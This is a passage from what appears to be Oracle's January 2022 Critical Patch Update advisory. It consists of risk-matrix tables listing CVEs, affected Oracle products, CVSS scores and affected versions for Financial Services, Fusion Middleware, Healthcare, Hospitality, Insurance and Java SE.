| CVE-2021-2351 | Oracle Financial Services Model Management and Governance | Installer & Configuration (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.0.8-8.1.1 |  |
| CVE-2021-2351 | Oracle Financial Services Trade-Based Anti Money Laundering Enterprise Edition | User Interface (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.0.7, 8.0.8 |  |
| CVE-2021-2351 | Oracle FLEXCUBE Investor Servicing | Infrastructure Code (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 12.0.4, 12.1.0, 12.3.0, 12.4.0, 14.4.0, 14.5.0 |  |
| CVE-2021-2351 | Oracle FLEXCUBE Private Banking | Miscellaneous (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 12.0.0, 12.1.0 |  |
| CVE-2020-11987 | Oracle Banking APIs | Framework (Apache Batik) | HTTP | Yes | 8.2 | Network | Low | None | None | Un- changed | High | Low | None | 18.3, 19.1, 19.2, 20.1, 21.1 |  |
| CVE-2020-11987 | Oracle Banking Digital Experience | Framework (Apache Batik) | HTTP | Yes | 8.2 | Network | Low | None | None | Un- changed | High | Low | None | 18.3, 19.1, 19.2, 20.1, 21.1 |  |
| CVE-2021-22118 | Oracle Financial Services Analytical Applications Infrastructure | Others (Spring Framework) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 8.0.8-8.1.1 |  |
| CVE-2021-36090 | Oracle Banking APIs | Framework (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 18.1-18.3, 19.1, 19.2, 20.1, 21.1 |  |
| CVE-2020-25649 | Oracle Banking APIs | Framework (jackson-databind) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | High | None | 18.1-18.3, 19.1, 19.2, 20.1, 21.1 |  |
| CVE-2021-37137 | Oracle Banking APIs | Framework (Netty) | Multiple | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 18.1-18.3, 19.1, 19.2, 20.1, 21.1 |  |
| CVE-2021-36090 | Oracle Banking Digital Experience | Framework (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 18.1-18.3, 19.1, 19.2, 20.1, 21.1 |  |
| CVE-2021-37137 | Oracle Banking Digital Experience | Framework (Netty) | Multiple | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 18.1-18.3, 19.1, 19.2, 20.1, 21.1 |  |
| CVE-2021-36090 | Oracle Banking Enterprise Default Management | Collections (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 2.7.0 |  |
| CVE-2021-36090 | Oracle Banking Party Management | Web UI (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 2.7.0 |  |
| CVE-2021-35043 | Oracle Banking Enterprise Default Management | Collections (AntiSamy) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 2.7.0 |  |
| CVE-2020-9281 | Oracle Banking Enterprise Default Management | Collections (CKEditor) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 2.7.0 |  |
| CVE-2021-35043 | Oracle Banking Party Management | Web UI (AntiSamy) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 2.7.0 |  |
| CVE-2021-35043 | Oracle Banking Platform | SECURITY (AntiSamy) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 2.7.0 |  |
| CVE-2021-45105 | Oracle Financial Services Analytical Applications Infrastructure | Others (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 8.0.7-8.1.1 | See Note 1 |
| CVE-2021-45105 | Oracle Financial Services Model Management and Governance | Installer & Configuration (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 8.0.8, 8.1.0, 8.1.1 | See Note 1 |
| CVE-2021-41165 | Oracle Banking APIs | Framework (CKEditor) | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 18.1-18.3, 19.1, 19.2, 20.1, 21.1 |  |
| CVE-2021-41165 | Oracle Banking Digital Experience | Framework (CKEditor) | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 18.1-18.3, 19.1, 19.2, 20.1, 21.1 |  |
| CVE-2021-37695 | Oracle Banking Party Management | Web UI (CKEditor) | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 2.7.0 |  |
| CVE-2021-37695 | Oracle Financial Services Analytical Applications Infrastructure | Others (CKEditor) | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 8.0.7-8.1.1 |  |
| CVE-2021-28164 | Oracle Banking APIs | Framework (Apache Ignite) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 20.1, 21.1 |  |
| CVE-2021-28164 | Oracle Banking Digital Experience | Framework (Apache Ignite) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 20.1, 21.1 |  |
| CVE-2021-35687 | Oracle Financial Services Analytical Applications Infrastructure | Unified Metadata Manager | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 8.0.7-8.1.1 |  |
| CVE-2021-29425 | Oracle Banking APIs | Framework (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 18.1-18.3, 19.1, 19.2, 20.1, 21.1 |  |
| CVE-2021-29425 | Oracle Banking Digital Experience | Framework (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 17.2, 18.1-18.3, 19.1, 19.2, 20.1, 21.1 |  |
| CVE-2021-29425 | Oracle Banking Enterprise Default Management | Collections (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 2.3.0-2.4.1, 2.6.2, 2.7.1, 2.10.0, 2.12.0 |  |
| CVE-2021-29425 | Oracle Banking Party Management | Web UI (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 2.7.0 |  |
| CVE-2021-29425 | Oracle Banking Platform | Security (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 2.3.0-2.4.1, 2.6.2, 2.7.1 |  |
| CVE-2021-29425 | Oracle Financial Services Analytical Applications Infrastructure | Others (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 8.0.7-8.1.1 |  |
| CVE-2021-29425 | Oracle Financial Services Model Management and Governance | Installer & Configuration (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 8.0.8, 8.1.0, 8.1.1 |  |
| CVE-2021-35686 | Oracle Financial Services Analytical Applications Infrastructure | Unified Metadata Manager | HTTP | No | 4.3 | Network | Low | Low | None | Un- changed | Low | None | None | 8.0.7-8.1.1 |  |

#### Notes:

1. This patch also addresses vulnerabilities CVE-2021-44228 and CVE-2021-45046. Customers need not apply the patches/mitigations of Security Alert CVE-2021-44228 and CVE-2021-45046 for this product.

#### Additional CVEs addressed are:

* The patch for CVE-2021-28164 also addresses CVE-2021-28163.
* The patch for CVE-2021-36090 also addresses CVE-2021-35515, CVE-2021-35516 and CVE-2021-35517.
* The patch for CVE-2021-37137 also addresses CVE-2021-37136.
* The patch for CVE-2021-37695 also addresses CVE-2021-32808 and CVE-2021-32809.
* The patch for CVE-2021-41165 also addresses CVE-2021-41164.

#### Oracle Food and Beverage Applications Risk Matrix

This Critical Patch Update contains 1 new security patch for Oracle Food and Beverage Applications.  This vulnerability is remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#FBBU)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2019-10086 | Oracle Hospitality Reporting and Analytics | Reporting (Apache Commons BeanUtils) | HTTP | Yes | 7.3 | Network | Low | None | None | Un- changed | Low | Low | Low | 9.1.0 |  |

#### Oracle Fusion Middleware Risk Matrix

This Critical Patch Update contains 39 new security patches for Oracle Fusion Middleware.  35 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#FMW)

Oracle Fusion Middleware products include Oracle Database components that are affected by the vulnerabilities listed in the Oracle Database section. The exposure of Oracle Fusion Middleware products is dependent on the Oracle Database version being used. Oracle Database security updates are not listed in the Oracle Fusion Middleware risk matrix. However, since vulnerabilities affecting Oracle Database versions may affect Oracle Fusion Middleware products, Oracle recommends that customers apply the Critical Patch Update January 2022 to the Oracle Database components of Oracle Fusion Middleware products. For information on what patches need to be applied to your environments, refer to Critical Patch Update January 2022 Patch Availability Document for Oracle Products, [My Oracle Support Note 2817011.1](https://support.oracle.com/rs?type=doc&id=2817011.1).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-35587 | Oracle Access Manager | OpenSSO Agent | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 11.1.2.3.0, 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2020-17530 | Oracle Business Intelligence Enterprise Edition | Installation (Apache Struts2) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2022-21306 | Oracle WebLogic Server | Core | T3 | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2021-40438 | Oracle HTTP Server | OSSL Module (Apache HTTP Server) | HTTP | Yes | 9.0 | Network | High | None | None | Changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-39154 | Oracle Business Activity Monitoring | Centralized Thirdparty Jars (XStream) | HTTP | No | 8.5 | Network | High | Low | None | Changed | High | High | High | 12.2.1.4.0 |  |
| CVE-2021-2351 | Oracle Data Integrator | Runtime Java agent for ODI (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-2351 | Oracle Enterprise Data Quality | General (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-2351 | Oracle Fusion Middleware | Centralized Third-party Jars (JDBC, OCCI, ODP for .NET) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2022-21346 | Oracle BI Publisher | BI Publisher Security | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 5.5.0.0.0, 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2019-17566 | Oracle Business Intelligence Enterprise Edition | Analytics Web Answers (Apache Batik) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | High | None | 5.5.0.0.0, 5.9.0.0.0, 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-36090 | Oracle Business Process Management Suite | Installer (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-4104 | Oracle WebLogic Server | Centralized Thirdparty Jars (Apache Log4j) | HTTP | No | 7.5 | Network | High | Low | None | Un- changed | High | High | High | 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2022-21292 | Oracle WebLogic Server | Samples | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2020-5258 | Oracle WebLogic Server | Samples (dojo) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | High | None | 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2022-21371 | Oracle WebLogic Server | Web Container | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2021-27568 | Oracle WebLogic Server | Web Services (json-smart) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2021-44832 | Oracle WebLogic Server | Centralized Thirdparty Jars (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 | See Note 1 |
| CVE-2022-21252 | Oracle WebLogic Server | Samples | HTTP | Yes | 6.5 | Network | Low | None | None | Un- changed | Low | Low | None | 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2022-21347 | Oracle WebLogic Server | Core | T3 | Yes | 6.5 | Network | Low | None | None | Un- changed | None | Low | Low | 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2022-21350 | Oracle WebLogic Server | Core | T3 | Yes | 6.5 | Network | Low | None | None | Un- changed | None | Low | Low | 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2022-21353 | Oracle WebLogic Server | Core | T3 | Yes | 6.5 | Network | Low | None | None | Un- changed | None | Low | Low | 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2020-2934 | Oracle WebLogic Server | Datasource (MySQL Connector) | SQL | Yes | 6.3 | Network | Low | None | Required | Un- changed | Low | Low | Low | 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2022-21361 | Oracle WebLogic Server | Sample apps | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2020-11023 | Oracle WebLogic Server | Sample apps (jQuery) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2022-21257 | Oracle WebLogic Server | Samples | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2022-21258 | Oracle WebLogic Server | Samples | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 14.1.1.0.0 |  |
| CVE-2022-21259 | Oracle WebLogic Server | Samples | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2022-21260 | Oracle WebLogic Server | Samples | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2022-21261 | Oracle WebLogic Server | Samples | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2022-21262 | Oracle WebLogic Server | Samples | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2022-21386 | Oracle WebLogic Server | Web Container | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2019-10219 | Oracle WebLogic Server | Web Services (JBoss Enterprise Application Platform) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2021-45105 | Oracle Business Intelligence Enterprise Edition | Analytics Server (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 5.5.0.0.0 | See Note 1 |
| CVE-2021-45105 | Oracle Managed File Transfer | MFT Runtime Server (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 12.2.1.3.0, 12.2.1.4.0 | See Note 1 |
| CVE-2021-45105 | Oracle WebCenter Portal | Security Framework (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 12.2.1.3.0, 12.2.1.4.0 | See Note 1 |
| CVE-2018-1324 | Oracle WebLogic Server | WLST (Apache Commons Compress) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 14.1.1.0.0 |  |
| CVE-2020-13956 | Oracle WebLogic Server | Samples (Apache HttpClient) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2021-29425 | Oracle Fusion Middleware MapViewer | Install (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 12.2.1.4.0 |  |
| CVE-2021-29425 | Oracle WebLogic Server | Third Party Tools (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |

#### Notes:

1. This patch also addresses vulnerabilities CVE-2021-44228 and CVE-2021-45046. Customers need not apply the patches/mitigations of Security Alert CVE-2021-44228 and CVE-2021-45046 for this product.

#### Additional CVEs addressed are:

* The patch for CVE-2018-1324 also addresses CVE-2018-11771.
* The patch for CVE-2020-11023 also addresses CVE-2019-11358 and CVE-2020-11022.
* The patch for CVE-2021-36090 also addresses CVE-2021-35515, CVE-2021-35516 and CVE-2021-35517.
* The patch for CVE-2021-39154 also addresses CVE-2021-29505, CVE-2021-39139, CVE-2021-39140, CVE-2021-39141, CVE-2021-39144, CVE-2021-39145, CVE-2021-39146, CVE-2021-39147, CVE-2021-39148, CVE-2021-39149, CVE-2021-39150, CVE-2021-39151, CVE-2021-39152 and CVE-2021-39153.
* The patch for CVE-2021-4104 also addresses CVE-2022-23302, CVE-2022-23305 and CVE-2022-23307
* The patch for CVE-2021-44832 also addresses CVE-2021-45105.

#### Oracle Health Sciences Applications Risk Matrix

This Critical Patch Update contains 8 new security patches for Oracle Health Sciences Applications.  All of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#HCAR)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Oracle Argus Analytics | Schema Creation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.2.1, 8.2.2, 8.2.3 |  |
| CVE-2021-2351 | Oracle Argus Insight | Schema Creation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.2.1, 8.2.2, 8.2.3 |  |
| CVE-2021-2351 | Oracle Argus Mart | Schema Creation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.2.1, 8.2.2, 8.2.3 |  |
| CVE-2021-2351 | Oracle Argus Safety | Schema Creation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.2.1, 8.2.2, 8.2.3 |  |
| CVE-2021-2351 | Oracle Clinical | Schema Creation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 5.2.1, 5.2.2 |  |
| CVE-2021-2351 | Oracle Health Sciences Clinical Development Analytics | Installation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 4.0.1 |  |
| CVE-2021-2351 | Oracle Health Sciences InForm CRF Submit | Installation and Configuration (JDBC, ODP for .NET) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 6.2.1 |  |
| CVE-2021-2351 | Oracle Thesaurus Management System | Report Generation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 5.2.3, 5.3.0, 5.3.1 |  |

#### Oracle HealthCare Applications Risk Matrix

This Critical Patch Update contains 4 new security patches for Oracle HealthCare Applications.  All of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#HC)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Oracle Health Sciences Information Manager | Health Policy Engine (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 3.0.2, 3.0.3 |  |
| CVE-2021-2351 | Oracle Healthcare Data Repository | Installation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 7.0.2, 8.1.0, 8.1.1 |  |
| CVE-2021-2351 | Oracle Healthcare Foundation | Installation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 7.3.0.0-7.3.0.2, 8.0.0-8.0.2, 8.1.0-8.1.1 |  |
| CVE-2021-2351 | Oracle Healthcare Translational Research | Installation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 4.1.0 |  |

#### Oracle Hospitality Applications Risk Matrix

This Critical Patch Update contains 3 new security patches for Oracle Hospitality Applications.  All of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#HOSP)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Oracle Hospitality OPERA 5 | Integrations (JDBC, ODP for .NET) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 5.6 |  |
| CVE-2021-2351 | Oracle Hospitality Suite8 | Rest API (ODP for .NET) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.10.2, 8.11.0, 8.12.0, 8.13.0, 8.14.0 |  |
| CVE-2021-42340 | Oracle Hospitality Cruise Shipboard Property Management System | Next-Gen SPMS (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 20.1.0 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-42340 also addresses CVE-2021-30640 and CVE-2021-33037.

#### Oracle Hyperion Risk Matrix

This Critical Patch Update contains 1 new security patch for Oracle Hyperion.  This vulnerability is remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#HYP)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Oracle Hyperion Infrastructure Technology | Installation and Configuration (JDBC, OCCI, ODP for .NET) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 11.2.7.0 |  |

#### Oracle iLearning Risk Matrix

This Critical Patch Update contains 1 new security patch for Oracle iLearning.  This vulnerability is remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#ILRN)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Oracle iLearning | Installation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 6.2, 6.3 |  |

#### Oracle Insurance Applications Risk Matrix

This Critical Patch Update contains 7 new security patches for Oracle Insurance Applications.  6 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#INSU)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2020-10683 | Oracle Insurance Policy Administration J2EE | Architecture (dom4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 10.2.0, 10.2.4, 11.0.2, 11.1.0-11.3.0 |  |
| CVE-2020-10683 | Oracle Insurance Rules Palette | Architecture (dom4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 10.2.0, 10.2.4, 11.0.2, 11.1.0-11.3.0 |  |
| CVE-2021-2351 | Oracle Insurance Data Gateway | Security (JDBC) | HTTP | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 11.0.2, 11.1.0, 11.2.7, 11.3.0, 11.3.1 |  |
| CVE-2021-2351 | Oracle Insurance Insbridge Rating and Underwriting | Framework Administrator IBFA (JDBC, ODP for .NET) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 5.2.0, 5.4.0-5.6.0 |  |
| CVE-2021-2351 | Oracle Insurance Policy Administration | Architecture (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 11.0.2, 11.1.0, 11.2.7, 11.3.0, 11.3.1 |  |
| CVE-2021-2351 | Oracle Insurance Rules Palette | Architecture (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 11.0.2, 11.1.0, 11.2.7, 11.3.0, 11.3.1 |  |
| CVE-2021-22118 | Oracle Insurance Rules Palette | Architecture (Spring Framework) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 11.0.2, 11.1.0, 11.2.7, 11.3.0, 11.3.1 |  |

#### Oracle Java SE Risk Matrix

This Critical Patch Update contains 18 new security patches for Oracle Java SE.  All of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#JAVA)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-22959 | Oracle GraalVM Enterprise Edition | Node (Node.js) | HTTP | Yes | 6.5 | Network | Low | None | None | Un- changed | Low | Low | None | Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 |  |
| CVE-2022-21349 | Oracle Java SE, Oracle GraalVM Enterprise Edition | 2D | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Oracle Java SE: 7u321, 8u311; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
| CVE-2022-21291 | Oracle Java SE, Oracle GraalVM Enterprise Edition | Hotspot | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
